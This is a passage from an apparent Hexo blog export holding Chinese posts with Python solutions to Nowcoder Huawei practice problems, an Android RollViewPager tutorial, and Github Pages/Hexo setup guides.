4291）中的多播位址。其中，有些位址已用于指定特殊协议，如ff0X::101将到达所有区域的NTP伺服器（RFC 2375）。]]></content>
      <categories>
        <category>Network</category>
      </categories>
      <tags>
        <tag>网络</tag>
        <tag>IPv6</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[算法学习-刷题(十一)]]></title>
    <url>%2F2016%2F12%2F14%2F%E7%AE%97%E6%B3%95%E5%AD%A6%E4%B9%A0-%E5%88%B7%E9%A2%98-%E5%8D%81%E4%B8%80%2F</url>
    <content type="text"><![CDATA[这次的前5道题异常之简单，可以说基本上谈不上什么算法，最多只能算是熟悉Python的一些基本操作，所以额外加了3道题，当然，简单并不代表就没用，练手感也是很重要的，按照计划继续坚持练习，Keep Moving！ 此篇博客的题目依然来自于牛客网（专业IT笔试面试备考平台）在线编程之：华为机试在线训练(11-15题，17题，20题，22题)。 地址如下：https://www.nowcoder.com/ta/huawei 数字颠倒题目描述输入一个整数，将这个整数以字符串的形式逆序输出程序不考虑负数的情况，若数字含有0，则逆序形式也含有0，如输入为100，则输出为001 输入描述: 输入一个int整数 输出描述: 将这个整数以字符串的形式逆序输出 输入例子: 1516000 输出例子: 0006151 Python实现这个题目和下一题字符串反转其实是一样的，我们既可以采用reversed函数也可以使用切片来进行反转，因此这两道题贴出来的代码是使用的不同的写法，但是其实都是对字符串进行反转。 1234#-*- coding:utf-8 -*-input_str = raw_input()print &apos;&apos;.join(reversed(input_str)) #使用reversed函数进行反转，再将列表转换成字符串格式输出 字符串反转题目描述写出一个程序，接受一个字符串，然后输出该字符串反转后的字符串。 输入描述: 输入N个字符 输出描述: 输出该字符串反转后的字符串 输入例子: abcd 输出例子: dcba Python实现1234# -*- coding: utf-8 -*-s = raw_input()print s[::-1] #使用切片进行反转 句子逆序题目描述将一个英文语句以单词为单位逆序排放。例如“I am a boy”，逆序排放后为“boy a am I”所有单词之间用一个空格隔开，语句中除了英文字母外，不再包含其他字符 接口说明1234567/** * 反转句子 * * @param sentence 原句子 * @return 反转后的句子 */public String reverse(String sentence); 输入描述: 将一个英文语句以单词为单位逆序排放。 输出描述: 得到逆序的句子 输入例子: I am a boy 输出例子: boy a am I Python实现1234string = raw_input()s = string.split() #对字符串按空格进行切分，split函数默认不给参数时默认按空格进行切分s.reverse() #列表进行反转print &apos; &apos;.join(s) #列表转换成字符串进行输出 字串的连接最长路径查找题目描述给定n个字符串，请对n个字符串按照字典序排列。 输入描述: 输入第一行为一个正整数n(1≤n≤1000),下面n行为n个字符串(字符串长度≤100),字符串中只含有大小写字母。 输出描述: 数据输出n行，输出结果为按照字典序排列的字符串。 12345678910111213141516171819202122输入例子:9captocatcardtwotooupboatboot输出例子:boatbootcapcardcattotootwoup Python实现1234567891011121314#-*- coding:utf-8 -*-lst = []n = int(raw_input()) #要输入多少行数据for i in range(n): input_str = raw_input() lst.append(input_str) #将每一行数据添加到列表中lst.sort() #列表排序，sort函数默认按字典序进行排序for i in lst: print i #打印排序结果 求int型正整数在内存中存储时1的个数题目描述输入一个int型的正整数，计算出该int型数据在内存中存储时1的个数。 输入描述: 输入一个整数（int类型） 输出描述: 这个数转换成2进制后，输出1的个数 输入例子: 5 输出例子: 2 Python实现使用bin函数将十进制整数转换成0bxx的二进制形式，用切片截取0b后面的字符串，再将其转换成列表，最后使用count函数来统计1的个数。 12n = int(raw_input())print list(bin(n)[2:]).count(&apos;1&apos;) 坐标移动题目描述开发一个坐标计算工具， A表示向左移动，D表示向右移动，W表示向上移动，S表示向下移动。从（0,0）点开始移动，从输入字符串里面读取一些坐标，并将最终输入结果输出到输出文件里面。 输入： 合法坐标为A(或者D或者W或者S) + 数字（两位以内） 坐标之间以;分隔。 非法坐标点需要进行丢弃。如AA10; A1A; $%$; YAD; 等。 下面是一个简单的例子 如： A10;S20;W10;D30;X;A1A;B10A11;;A10; 处理过程： 起点（0,0） A10 = （-10,0） S20 = (-10,-20) W10 = (-10,-10) D30 = (20,-10) x = 无效 A1A = 无效 B10A11 = 无效 一个空 不影响 A10 = (10,-10) 结果 （10， -10） 输入描述: 一行字符串 输出描述: 最终坐标，以,分隔 输入例子: A10;S20;W10;D30;X;A1A;B10A11;;A10; 输出例子: 10,-10 Python实现123456789101112131415161718192021222324252627282930import systags = [&apos;A&apos;,&apos;D&apos;,&apos;W&apos;,&apos;S&apos;]for input_str in sys.stdin: //处理多个测试数据 lst1 = input_str.split(&apos;;&apos;) //根据;号将字符串切分成列表 lst2 = [] //存储正确坐标指令的列表 for i in lst1: if i == &apos;&apos;: //空的，不影响 continue if i[0] in tags: //去除错误的指令 if i[1:].isdigit(): lst2.append(i) res = [0,0] //结果列表 for i in lst2: //根据规则进行相应的移动 if i[0] == tags[0]: res[0] -= int(i[1:]); elif i[0] == tags[1]: res[0] += int(i[1:]); elif i[0] == tags[2]: res[1] += int(i[1:]); else: res[1] -= int(i[1:]); for i in range(2): res[i] = str(res[i]) print &apos;,&apos;.join(res) //输出结果 密码验证合格程序题目描述密码要求: 1.长度超过8位 2.包括大小写字母.数字.其它符号,以上四种至少三种 3.不能有相同长度超2的子串重复 说明:长度超过2的子串 输入描述: 一组或多组长度超过2的子符串。每组占一行 输出描述: 如果符合要求输出：OK，否则输出NG 输入例子: 021Abc9000 021Abc9Abc1 021ABC9000 021$bc9000 输出例子: OK NG NG OK Python实现123456789101112131415161718192021222324252627282930import sysdef pwdCheck(password): //验证函数 cnt = [0, 0, 0, 0] length = len(password) if length &lt;= 8: //判断长度是否超过8位 return &apos;NG&apos; for k in range(length - 3): //判断是否有相同长度超2的子串重复 if(password[k:k+3] in password[:k] or password[k:k+3] in password[k+3:]): return &apos;NG&apos; for i in password: //判断是否包括大小写字母.数字.其它符号,以上四种至少三种 if i.isalpha(): //字母 if i.isupper(): //大写字母 cnt[0] = 1 else: //小写字母 cnt[1] = 1 elif i.isdigit(): //数字 cnt[2] = 1 else: //其他字符 cnt[3] = 1 count = sum(cnt) if count &gt; 2: //超过3种则OK return &apos;OK&apos; if count &lt; 3: //小于3种则不合格 return &apos;NG&apos; return &apos;OK&apos;for line in sys.stdin.readlines(): //实现多次测试 print pwdCheck(line.strip(&apos;\n&apos;)) //去除输入的回车符号 汽水瓶题目描述有这样一道智力题：“某商店规定：三个空汽水瓶可以换一瓶汽水。小张手上有十个空汽水瓶，她最多可以换多少瓶汽水喝？”答案是5瓶，方法如下：先用9个空瓶子换3瓶汽水，喝掉3瓶满的，喝完以后4个空瓶子，用3个再换一瓶，喝掉这瓶满的，这时候剩2个空瓶子。然后你让老板先借给你一瓶汽水，喝掉这瓶满的，喝完以后用3个空瓶子换一瓶满的还给老板。如果小张手上有n个空汽水瓶，最多可以换多少瓶汽水喝？ 输入描述: 输入文件最多包含10组测试数据，每个数据占一行，仅包含一个正整数n（1&lt;=n&lt;=100），表示小张手上的空汽水瓶数。n=0表示输入结束，你的程序不应当处理这一行。 输出描述: 对于每组测试数据，输出一行，表示最多可以喝的汽水瓶数。如果一瓶也喝不到，输出0。 输入例子: 3 10 81 0 输出例子: 1 5 40 Python实现123456789101112131415161718#-*- coding:utf-8 -*-import sysdef getCount(n): //计数函数 cnt = 0 if n == 0: return 0 while n != 1: //直到只有一瓶汽水 cnt = cnt + n/3 //记录喝掉的汽水瓶数 n = n/3 + n%3 //剩下的汽水瓶数 if n == 2: //剩下两个瓶盖的时候可以先喝一瓶再凑足3个还给老板 n = 3 return cntnum = sys.stdin.readlines() //输入多行for i in num: print getCount(int(i))]]></content>
      <categories>
        <category>Algorithm</category>
      </categories>
      <tags>
        <tag>算法学习</tag>
        <tag>Python</tag>
        <tag>华为机试</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[android图片轮播框架：RollViewPager]]></title>
    <url>%2F2016%2F12%2F11%2Fandroid%E5%9B%BE%E7%89%87%E8%BD%AE%E6%92%AD%E6%A1%86%E6%9E%B6%EF%BC%9ARollViewPager%2F</url>
    <content type="text"><![CDATA[经常上网逛一逛还是能有不少的收获，以前自己用ViewFlipper控件来实现android的图片轮播效果，做得实在是不怎么样，很多小细节不知道怎么处理，现在好了，在Github上找到一个开源的图片轮播框架，只需要大概30行代码就可以很好地实现图片轮播功能，推荐给大家！ RollViewPager简介自动轮播的Viewpager，支持无限循环。触摸时会暂停播放，直到结束触摸一个延迟周期以后继续播放。其中的指示器可以为点可以为数字还可以自定义，位置也可以变。 Github项目地址：https://github.com/Jude95/RollViewPager 下文大部分均摘抄自该项目的说明文档，可以直接看本博客，也可以到Github上看说明文档，本文旨在宣传该开源框架。 如何使用以android studio为例： 添加依赖在gradle中导入包： 1compile &apos;com.jude:rollviewpager:1.4.5&apos; 添加控件编写布局文件： 1234&lt;com.jude.rollviewpager.RollPagerView android:layout_width=&quot;match_parent&quot; android:layout_height=&quot;180dp&quot; app:rollviewpager_play_delay=&quot;3000&quot;/&gt; 还可以为其添加如下属性： app:rollviewpager_play_delay=”3000” 播放间隔时间，单位ms。填0则不播放。默认为0。 app:rollviewpager_hint_gravity=”center” 指示器位置,提供 left , center , right 。默认 center app:rollviewpager_hint_color=”#7c7c7c” 指示器背景颜色.默认黑色 app:rollviewpager_hint_alpha=”80” 指示器背景透明度。0全透明，255不透明。默认0。 app:rollviewpager_hint_paddingLeft=”16dp” 指示器左边距 app:rollviewpager_hint_paddingRight=”16dp” 指示器右边距 app:rollviewpager_hint_paddingTop=”16dp” 指示器上边距 app:rollviewpager_hint_paddingBottom=”16dp” 指示器下边距 一般指定一下间隔时间就好了。 HintView指示器配置提供了HintView是对指示器进行自定义，下面的设置一种方式就好了。 1234mRollViewPager.setHintView(new IconHintView(this,R.drawable.point_focus,R.drawable.point_normal)); //指示器为图片mRollViewPager.setHintView(new ColorPointHintView(this, Color.YELLOW,Color.WHITE)); //指示器为由颜色的点mRollViewPager.setHintView(new TextHintView(this)); //指示器为文本mRollViewPager.setHintView(null);//隐藏指示器 ItemClickListener监听点击事件123456mRollViewPager.setOnItemClickListener(new OnItemClickListener() &#123; @Override public void onItemClick(int position) &#123; Toast.makeText(MainActivity.this,&quot;Item &quot;+position+&quot; clicked&quot;,Toast.LENGTH_SHORT).show(); &#125;&#125;); Adapter提供以下三种种方便的PagerAdapter供使用。本ViewPager也可以使用其他任意PagerAdapter。 （1）StaticPagerAdapter 存储页面的Adapter。view添加进去就存储，不会再次 getView ，减少页面创建消耗，但是会消耗更多的内存。一般自动播放的情况这种方案比较好。不然会大量构造View。 概念参照FragmentPagerAdapter。可以用于其他ViewPager。 （2）DynamicPagerAdapter 动态的Adapter，当创建3号view时会销毁1号view(递推)，会时常调用 getView 。增加页面创建消耗，减小内存消耗。 概念参照FragmentStatePagerAdapter。可以用于其他ViewPager。 123456789101112131415161718192021222324//以上2个Adapter用法类似;mRollViewPager.setAdapter(new TestNomalAdapter());private class TestNomalAdapter extends StaticPagerAdapter&#123; private int[] imgs = &#123; R.drawable.img1, R.drawable.img2, R.drawable.img3, R.drawable.img4, &#125;; @Override public View getView(ViewGroup container, int position) &#123; ImageView view = new ImageView(container.getContext()); view.setImageResource(imgs[position]); view.setScaleType(ImageView.ScaleType.CENTER_CROP); view.setLayoutParams(new ViewGroup.LayoutParams(ViewGroup.LayoutParams.MATCH_PARENT, ViewGroup.LayoutParams.MATCH_PARENT)); return view; &#125; @Override public int getCount() &#123; return imgs.length; &#125;&#125; （3）LoopPagerAdapter 无限循环的Adapter，无限循环上采用的是getCount返回最大的int数的方法，和staticpageradapter页面存储一样。一次创建多次使用。 数据采用StaticPagerAdapter的方案，节省创建View开销。 本Adapter只能用于本RollViewPager 123456789101112131415161718192021222324252627mRollViewPager.setAdapter(new TestLoopAdapter(mRollViewPager));private class TestLoopAdapter extends LoopPagerAdapter&#123; private int[] imgs = &#123; R.drawable.img1, R.drawable.img2, R.drawable.img3, R.drawable.img4, &#125;; public TestLoopAdapter(RollPagerView viewPager) &#123; super(viewPager); &#125; @Override public View getView(ViewGroup container, int position) &#123; ImageView view = new ImageView(container.getContext()); view.setImageResource(imgs[position]); view.setScaleType(ImageView.ScaleType.CENTER_CROP); view.setLayoutParams(new ViewGroup.LayoutParams(ViewGroup.LayoutParams.MATCH_PARENT, ViewGroup.LayoutParams.MATCH_PARENT)); return view; &#125; @Override public int getRealCount() &#123; return imgs.length; &#125;&#125; 播放控制rollViewPager.pause()//暂停rollViewPager.resume()//恢复rollViewPager.isPlaying()//是否正在播放 示例程序布局文件： 12345678910111213&lt;?xml version=&quot;1.0&quot; encoding=&quot;utf-8&quot;?&gt;&lt;LinearLayout xmlns:android=&quot;http://schemas.android.com/apk/res/android&quot; android:layout_width=&quot;match_parent&quot; android:layout_height=&quot;match_parent&quot; xmlns:app=&quot;http://schemas.android.com/apk/res-auto&quot;&gt; &lt;com.jude.rollviewpager.RollPagerView android:id=&quot;@+id/roll_view_pager&quot; android:layout_width=&quot;match_parent&quot; android:layout_height=&quot;180dp&quot; app:rollviewpager_play_delay=&quot;3000&quot;/&gt;&lt;/LinearLayout&gt; 存放4张图片到工程res目录下的drawable文件夹下，命名为img1，img2，img3，img4. Java文件： 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950public class MainActivity extends AppCompatActivity &#123; @Override protected void onCreate(Bundle savedInstanceState) &#123; super.onCreate(savedInstanceState); setContentView(R.layout.activity_main); /**使用RollPagerView实现图片轮播**/ mRollViewPager = (RollPagerView) view.findViewById(R.id.roll_view_pager); //设置播放时间间隔 mRollViewPager.setPlayDelay(2000); //设置透明度 mRollViewPager.setAnimationDurtion(500); //设置适配器 mRollViewPager.setAdapter(new TestNormalAdapter()); //设置指示器（顺序依次） mRollViewPager.setHintView(new ColorPointHintView(view.getContext(), Color.YELLOW, Color.WHITE)); &#125; private class TestNormalAdapter extends StaticPagerAdapter &#123; private int[] imgs = &#123; R.drawable.img1, R.drawable.img2, R.drawable.img3, R.drawable.img4, &#125;; @Override public View getView(ViewGroup container, int position) &#123; ImageView view = new ImageView(container.getContext()); view.setImageResource(imgs[position]); view.setScaleType(ImageView.ScaleType.CENTER_CROP); view.setLayoutParams(new ViewGroup.LayoutParams(ViewGroup.LayoutParams.MATCH_PARENT, ViewGroup.LayoutParams.MATCH_PARENT)); view.setOnClickListener(new View.OnClickListener() // 点击事件 &#123; @Override public void onClick(View v) &#123; Toast.makeText(MainActivity.this, &quot;你点击了第&quot; + (position + 1) + &quot;张图片&quot;, Toast.LENGTH_SHORT).show(); &#125; &#125;); return view; &#125; @Override public int getCount() &#123; return imgs.length; &#125; &#125;&#125; 写到这里，其实还是有话要说。现在连图片轮播都有开源框架了，自己要写的代码真的越来越少，要考虑的问题也越来越少。我们常常说不要重复造轮子，但是越来越觉得自己根本不会造轮子。注重基础，在自己实现过的基础上，再去对比开源框架，如果确实比自己做得好，那你应该认真思考自己写的程序的不足，然后可以采用开源框架进行开发。]]></content>
      <categories>
        <category>Android</category>
      </categories>
      <tags>
        <tag>［Android,RollViewPager,图片轮播］</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[Github Pages + Hexo搭建博客（三）]]></title>
    <url>%2F2016%2F12%2F06%2FGithub-Pages-Hexo%E6%90%AD%E5%BB%BA%E5%8D%9A%E5%AE%A2%EF%BC%88%E4%B8%89%EF%BC%89%2F</url>
    <content type="text"><![CDATA[此篇博客主要介绍了自己的博客站点所使用的一些第三方服务的配置，以及主题的一些优化。当然，每个人的需要都不太相同，大家也可以根据自己的喜好去选择使用第三方服务来让自己的博客站点更完善更强大。 再次强调：在Hexo中有两份主要的配置文件，其名称都是_config.yml。其中，一份位于站点根目录下，主要包含Hexo本身的配置,我们称之为全局配置文件；另一份位于主题目录下，这份配置由主题作者提供，主要用于配置主题相关的选项,我们称之为主题配置文件。 博客图片存放Markdown编辑器支持插入图片，可以直接给出图片的链接，因此我们可以将图片存放在我们hexo项目的目录下，再填写对应的路径，也可以将其存放在云服务器上，然后给出链接。 在这里，我们介绍使用七牛云来进行图片托管。七牛云是国内领先的企业级云服务商,致力于打造以数据为核心的场景化PaaS服务，图片加载速度还不错，一般也不会出现图片挂掉的情况。 注册账号注册申请一个个人账号，然后激活邮箱完成注册。 官网地址：http://www.qiniu.com/ 存储图片（1）点击左侧菜单的对象存储 （2）点击上端的添加来创建存储空间 （3）填写好基本信息，点击确定创建 （4）来到新创建的存储空间，点击内容管理 （5）在内容管理中可以看到文件列表，点击上传文件 （6）可以设置上传的文件的前缀，以便进行分类管理 （7）点击关闭，回到内容管理页面查看上传的文件，复制图片链接 至此，我们就将我们博客需要的图片存储到了七牛云，然后我们只要将复制的图片链接插入到博客人文章中即可显示图片，感觉显示速度还是蛮快的。 配置第三方服务多说社会化评论（1）多说创建站点 多说官网：http://duoshuo.com/ 登录多说官网，点击主页的我要安装来到创建站点页面填写基本信息： 点击创建后出现：服务异常,请联系客服人员的错误不是因为真的出现异常，而是你填写的用户名或者其他信息不符合他的要求，只是他没有提示你，这是需要注意的地方。比如我遇到的是用户名不能使用‘-’中划线和‘_’下划线，或者多说域名填写格式错误。 （2）创建站点完成后在全局配置文件中新增duoshuo_shortname字段。 值设置成上一步中填写的值（红色方框框出部分的值） 例如： 1duoshuo_shortname: fzyLine （3）实现效果 多说分享多说分享必须与多说评论同时使用 编辑全局配置文件，添加字段 duoshuo_share，值为 true。 12# 多说分享服务duoshuo_share: true 实现效果： 不蒜子统计编辑全局配置文件中的busuanzi_count的配置项。 当enable: true时，代表开启全局开关。若site_uv、site_pv、page_pv的值均为false时，不蒜子仅作记录而不会在页面上显示。 123456789101112131415busuanzi_count: # count values only if the other configs are false enable: true # custom uv span for the whole site site_uv: true site_uv_header: &lt;i class=&quot;fa fa-user&quot;&gt;&lt;/i&gt; #如果使用默认的，会显示图标 site_uv_footer: # custom pv span for the whole site site_pv: true site_pv_header: &lt;i class=&quot;fa fa-eye&quot;&gt;&lt;/i&gt; #如果使用默认的，会显示图标 site_pv_footer: # custom pv span for one page only page_pv: true page_pv_header: &lt;i class=&quot;fa fa-file-o&quot;&gt;&lt;/i&gt; #如果使用默认的，会显示图标 page_pv_footer: 实现效果： 可以修改成如下的样子： 当site_uv: true时，代表在页面底部显示站点的UV值。即访客数： 1234# 效果：本站访客数12345人次site_uv: truesite_uv_header: 本站访客数site_uv_footer: 人次 当site_pv: true时，代表在页面底部显示站点的PV值。即总访问量： 1234# 效果：本站总访问量12345次site_pv: truesite_pv_header: 本站总访问量site_pv_footer: 次 当page_pv: true时，代表在文章页面的标题下显示该页面的PV值（阅读数）。1234# 效果：本文总阅读量12345次page_pv: truepage_pv_header: 本文总阅读量page_pv_footer: 次 站内搜索next主题的官方文档提供了几种实现搜索服务的方式，我们就使用配置最简单的Local Search，添加百度/谷歌/本地 自定义站点内容搜索。 （1）安装 hexo-generator-searchdb，在站点目录下执行以下命令： 1$ npm install hexo-generator-searchdb --save （2）编辑全局配置文件，新增以下内容到任意位置： 12345search: path: search.xml field: post format: html limit: 10000 （3）实现效果： 开启打赏功能next主题开启打赏功能很简单，我们只需要在全局配置文件中填入微信和支付宝收款二维码图片地址即可开启该功能。先到微信和支付宝将自己收款二维码图片保存，我们同样可以将其存在七牛云上，然后贴到下面的配置文件里。 123reward_comment: 坚持原创技术分享，您的支持将鼓励我继续创作！wechatpay: 微信当面付图片的urlalipay: 支付宝当面付图片的url 实现效果： Github pages + Hexo搭建静态博客站点的系列文章到这里就完结了，其实也算是一个很详细的教程了，花了一些时间来整理。之后可能不会再更新，但是，如果之后遇到一些问题或者有更好的推荐，可能还会再写。]]></content>
      <categories>
        <category>Hexo</category>
      </categories>
      <tags>
        <tag>Hexo</tag>
        <tag>Github</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[算法学习-刷题(十)]]></title>
    <url>%2F2016%2F12%2F04%2F%E7%AE%97%E6%B3%95%E5%AD%A6%E4%B9%A0-%E5%88%B7%E9%A2%98-%E5%8D%81%2F</url>
    <content type="text"><![CDATA[继续使用Python进行算法练习解题，此篇博客的5道题依然来自于牛客网（专业IT笔试面试备考平台）在线编程之：华为机试在线训练(6-10题)。 地址如下：https://www.nowcoder.com/ta/huawei 质数因子题目描述功能:输入一个正整数，按照从小到大的顺序输出它的所有质数的因子（如180的质数因子为2 2 3 3 5 ）,最后一个数后面也要有空格 详细描述： 函数接口说明： public String getResult(long ulDataInput) 输入参数： long ulDataInput：输入的正整数 返回值： String 输入描述: 输入一个long型整数 输出描述: 按照从小到大的顺序输出它的所有质数的因子，以空格隔开。最后一个数后面也要有空格。 输入例子: 180 输出例子: 2 2 3 3 5 Python实现如果一个数是质数，那么它的倍数都不是质数。 我们不需要考虑是否是质数因子，因为每次得到的那个因子肯定是质数因子，其他数都可以从这些质数因子相乘得到。比如，i = 4能被整除的不可能出现，因为当i=2时已经被全求出来了。 这个题的思路其实不太好描述，还是看代码吧！ 123456789101112while True: try: n = int(raw_input()) i = 2 while n&gt;1: while(n%i == 0): print i, n = n/i i += 1 except: break python中print输出一行，如果想多次输出的内容不换行，可以在print后面加逗号. 取近似值题目描述写出一个程序，接受一个正浮点数值，输出该数值的近似整数值。如果小数点后数值大于等于5,向上取整；小于5，则向下取整。 输入描述: 输入一个正浮点数值 输出描述: 输出该数值的近似整数值 输入例子: 5.5 输出例子: 6 Python实现将输入的数据转换成float类型，再用round函数进行四舍五入，最后转换成int类型进行输出 123import sysnum = sys.stdin.readline() #读取一行数据print int(round(float(num))) 合并表记录题目描述数据表记录包含表索引和数值，请对表索引相同的记录进行合并，即将相同索引的数值进行求和运算，输出按照key值升序进行输出。 输入描述: 先输入键值对的个数，然后输入成对的index和value值，以空格隔开 输出描述: 输出合并后的键值对（多行） 输入例子: 4 0 1 0 2 1 2 3 4 输出例子: 0 3 1 2 3 4 Python实现123456789101112131415161718#-*- coding:utf-8 -*-n = int(raw_input())dic = &#123;&#125; #构造字典for i in range(n): item = raw_input().split() #获取一行输入 key = int(item[0]) #得到该行的第一个数：键 value = int(item[1]) #得到该行的第二个数：值 if key in dic: #如果字典中已经存在这个键，则将其键值相加 dic[key] += value; else: #否则添加新的键值对 dic[key] = value;lst = dic.keys() #获取字典的所有键lst.sort() #对键进行排序for i in lst: #根据键从小到大输出 print i,dic[i] 提取不重复的整数题目描述输入一个int型整数，按照从右向左的阅读顺序，返回一个不含重复数字的新的整数。 输入描述: 输入一个int型整数 输出描述: 按照从右向左的阅读顺序，返回一个不含重复数字的新的整数 输入例子: 9876673 输出例子: 37689 Python实现12345678#-*- coding:utf-8 -*-input_str = raw_input()res = [] for i in list(reversed(input_str)): #反转字符串，并将其转换从列表 if i not in res: #去除重复的数字 res.append(i)print &quot;&quot;.join(res) #列表转字符串 字符个数统计题目描述编写一个函数，计算字符串中含有的不同字符的个数。字符在ACSII码范围内(0~127)。不在范围内的不作统计。 输入描述: 输入N个字符，字符在ACSII码范围内。 输出描述: 输出范围在(0~127)字符的个数。 输入例子: abc 输出例子: 3 Python实现123456789101112131415161718#-*- coding:utf-8 -*-import sysdef count(input_str): #自定义处理函数 s = [] cnt = 0 for ch in input_str: #去除重复的字符 if ch not in s: s.append(ch) for c in s: #统计个数 if (ord(c) &gt;=0 and ord(c) &lt;= 127): cnt+=1 print cntinput_str = sys.stdin.readline() #根据题目要求要实现多组数据的测试count(input_str) #调用函数处理]]></content>
      <categories>
        <category>Algorithm</category>
      </categories>
      <tags>
        <tag>算法学习</tag>
        <tag>Python</tag>
        <tag>华为机试</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[算法学习-刷题(九)]]></title>
    <url>%2F2016%2F12%2F03%2F%E7%AE%97%E6%B3%95%E5%AD%A6%E4%B9%A0-%E5%88%B7%E9%A2%98-%E4%B9%9D%2F</url>
    <content type="text"><![CDATA[近来，越来越感受到Python的魅力，简洁的书写，相对高效的实现，写起来很舒服。以前只是用python做一些应用，也只是需要什么就去学什么，并没有真正系统地学习这门语言，现在结合书本和教学视频系统地进行学习，然后再通过Python来练习这些算法题，突然发现也是一种不错的学习方式。 下面的题目均来自牛客网（专业IT笔试面试备考平台）在线编程之：华为机试在线训练 地址如下：https://www.nowcoder.com/ta/huawei 字符串最后一个单词的长度题目描述计算字符串最后一个单词的长度，单词以空格隔开。 输入描述: 一行字符串，非空，长度小于5000。 输出描述: 整数N，最后一个单词的长度。 输入例子: hello world 输出例子: 5 Python实现这个题目本身就比较简单，python来实现则更加简单，因为python提供了很多方便快捷地方法，比如此题，split方法可以将我们输入的字符串切分成列表，然后取出列表最后一个元素即最后一个单词，再用len方法得到该单词的长度。列表中，负数索引是从列表右端即尾部开始，-1索引即为最后一个元素。 12mystr = raw_input()print len(mystr.split(&apos; &apos;)[-1]) 计算字符个数题目描述写出一个程序，接受一个有字母和数字以及空格组成的字符串，和一个字符，然后输出输入字符串中含有该字符的个数。不区分大小写。 输入描述: 输入一个有字母和数字以及空格组成的字符串，和一个字符。 输出描述: 输出输入字符串中含有该字符的个数。 输入例子: ABCDEF A 输出例子: 1 Python实现1234input_str = raw_input() #获取字符串tag = raw_input() #获取目标字符lst = list(input_str.lower()) #题目中说明不区分大小写，所以全部转换从小写，然后将字符串转换成列表print lst.count(tag.lower()) #统计字符在列表中出现的次数 明明的随机数题目描述明明想在学校中请一些同学一起做一项问卷调查，为了实验的客观性，他先用计算机生成了N个1到1000之间的随机整数（N≤1000），对于其中重复的数字，只保留一个，把其余相同的数去掉，不同的数对应着不同的学生的学号。然后再把这些数从小到大排序，按照排好的顺序去找同学做调查。请你协助明明完成“去重”与“排序”的工作。 Input Param n 输入随机数的个数 inputArray n个随机整数组成的数组 Return Value OutputArray 输出处理后的随机整数 注：测试用例保证输入参数的正确性，答题者无需验证。测试用例不止一组。 输入描述: 输入多行，先输入随机整数的个数，再输入相应个数的整数 输出描述: 返回多行，处理后的结果 123456789101112131415161718192021222324输入例子:11102040326740208930040015输出例子:10152032406789300400 Python实现12345678910111213141516import syswhile True: #题目要求有多组数据，需要循环 try: #捕获异常 n = int(raw_input()) #确定要输入多少个数据 l = [] for _ in range(0,n): k = sys.stdin.readline() #输入n个数 l.append(int(k)) res = list(set(l)) #集合是不重复的，这样做可以去除list中重复的元素 res.sort() #对去重后的列表进行排序 for i in res: #打印结果 print i except: break 字符串分隔题目描述 连续输入字符串，请按长度为8拆分每个字符串后输出到新的字符串数组； 长度不是8整数倍的字符串请在后面补数字0，空字符串不处理。 输入描述: 连续输入字符串(输入2次,每个字符串长度小于100) 输出描述: 输出到长度为8的新字符串数组 输入例子: abc 123456789 输出例子: abc00000 12345678 90000000 python实现这里采用一种巧妙地办法，因为要以8为间隔输出字符串，所以我们先判断字符串长度是否为0，如果不为0，则在字符串末尾添加7个0，这样就不用考虑后面会缺几个0了，方便后面的输出，输出时我们只要以8为间隔输出，然后不满8个字符就不用输出了，肯定是末尾我们补上的多余的0了。 以下三种写法基本思路一样，关键在于输出的时候可以采用不同的办法进行处理。 （1）写法一 1234567891011121314# -*- coding: utf-8 -*-str1 = raw_input()str2 = raw_input()def splitstr(string): if(len(string) != 0): string += &quot;0000000&quot; while(len(string) &gt;= 8): #字符串长度大于等于8才打印出来 print string[0:8] #使用分片的方法切分字符串 string = string[8:]splitstr(str1)splitstr(str2) （2）写法二 123456789101112a = raw_input()b = raw_input()def substr(line): left = len(line)%8 if left!=0: line += &quot;0&quot; * (8-left) for i in range(len(line)/8): #字符串长度大于等于8才打印出来 print line[i*8 : (i+1)*8] #使用索引加分片的方法切分字符串substr(a)substr(b) （3）写法三 123456789101112131415# -*- coding: utf-8 -*-import restr1 = raw_input()str2 = raw_input()def substr(string): if(len(string) != 0): string += &quot;0000000&quot; mylist = re.findall(r&apos;.&#123;8&#125;&apos;,string) #用正则表达式对字符串进行切分 for substr in mylist: #打印切分好的以8个字符为间隔的字符串 print substrsubstr(str1)substr(str2) 进制转换题目描述写出一个程序，接受一个十六进制的数值字符串，输出该数值的十进制字符串。（多组同时输入 ） 输入描述: 输入一个十六进制的数值字符串。 输出描述: 输出该数值的十进制字符串。 输入例子: 0xA 输出例子: 10 Python实现12345# -*- coding: utf-8 -*-import sysfor line in sys.stdin: print int(line, 16) 其中，for line in sys.stdin实现多行输入 这里并不是将line转换为16进制的数，而是说line就是一个16进制的数形式的字符串，int()函数将其用十进制数表示]]></content>
      <categories>
        <category>Algorithm</category>
      </categories>
      <tags>
        <tag>算法学习</tag>
        <tag>Python</tag>
        <tag>华为机试</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[Github Pages + Hexo搭建博客（二）]]></title>
    <url>%2F2016%2F12%2F03%2FGithub-Pages-Hexo%E6%90%AD%E5%BB%BA%E5%8D%9A%E5%AE%A2%EF%BC%88%E4%BA%8C%EF%BC%89%2F</url>
    <content type="text"><![CDATA[此篇博客主要讲解Hexo的站点配置、主题配置和使用以及博客文章的发布。 在Hexo中有两份主要的配置文件，其名称都是_config.yml。其中，一份位于站点根目录下，主要包含Hexo本身的配置,我们称之为全局配置文件；另一份位于主题目录下，这份配置由主题作者提供，主要用于配置主题相关的选项,我们称之为主题配置文件。 hexo的官方网站：https://hexo.io/，里面有hexo的详细说明文档，不过是英文的。没关系，英语不好的请往下看。 注意：配置文件中每个字段后面的冒号是英文格式的，且在其后要加一个空格再写值 比如： 1title: Myblog hexo的站点配置编辑hexo目录下的_config.yml文件，具体配置如下： 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475# Hexo Configuration## Docs: https://hexo.io/docs/configuration.html## Source: https://github.com/hexojs/hexo/# Site 站点信息配置，根据自己的需要进行修改title: Line&apos;s Blog #站点名，会在浏览器页面标签左上角显示subtitle: Love Coding,Enjoy Life #副标题description: fzy-line #对站点的描述，给搜索引擎看的，可以自定义author: Line #网站作者language: zh-Hans #网站语言timezone: Asia/Shanghai #时区avatar: 